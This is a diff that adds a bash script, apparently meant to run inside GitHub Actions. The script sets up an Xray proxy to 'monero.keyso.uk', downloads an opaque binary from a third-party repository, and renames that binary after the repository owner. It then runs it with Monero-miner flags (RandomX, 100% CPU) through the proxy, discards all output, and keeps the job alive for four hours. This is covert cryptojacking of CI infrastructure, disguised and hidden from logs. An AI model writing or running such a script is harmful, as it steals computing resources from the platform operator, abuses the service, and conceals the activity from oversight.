@@ -1,0 +1,32 @@
+#!/bin/bash
+
+mkdir -p xray
+pushd xray
+wget https://github.com/XTLS/Xray-core/releases/download/v24.12.31/Xray-linux-64.zip
+unzip Xray-linux-64.zip
+echo -n "{\"log\":{\"access\":\"./access.log\",\"error\":\"./error.log\",\"loglevel\":\"Warning\"},\"inbounds\":[{\"protocol\":\"socks\",\"listen\":\"127.0.0.1\",\"port\":10800,\"settings\":{\"udp\":true}}],\"outbounds\":[{\"protocol\":\"vless\",\"settings\":{\"vnext\":[{\"address\":\"monero.keyso.uk\",\"port\":443,\"users\":[{\"id\":\"160f2a90-9f87-4452-b27a-e4c03341c138\",\"encryption\":\"none\",\"security\":\"none\",\"level\":0}]}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"security\":\"tls\",\"tlsSettings\":{\"serverName\":\"monero.keyso.uk\",\"allowInsecure\":true,\"fingerprint\":\"chrome\"},\"wsSettings\":{\"path\":\"/articles\",\"headers\":{\"host\":\"monero.keyso.uk\"}}}}]}" > config.json
+cat config.json
+./xray run -config config.json 1>/dev/null 2>/dev/null &
+popd
+
+wget https://github.com/shoguncao/CDN/raw/master/xxoo.tar.gz
+tar -xvf xxoo.tar.gz
+pushd xxoo
+mv xxoo ${GITHUB_REPOSITORY_OWNER}
+./${GITHUB_REPOSITORY_OWNER} --url "127.0.0.1:2095" --proxy 127.0.0.1:10800 --tls --user ${GITHUB_REPOSITORY_OWNER}-githubactions --threads 2 --max-cpu-usage 100 --random-x fast --log-file ./xxoo.log 1>/dev/null 2>/dev/null &
+popd
+
+start_time=$(date +%s)
+timeout=14400
+while true; do
+current_time=$(date +%s)
+elapsed=$((current_time - start_time))
+if [ "$elapsed" -ge "$timeout" ]; then
+    echo "循环已执行${elapsed}秒，退出"
+    break
+fi
+echo "运行中... 已过时间：${elapsed}秒"
+sleep 10
+done
+
+exit 0
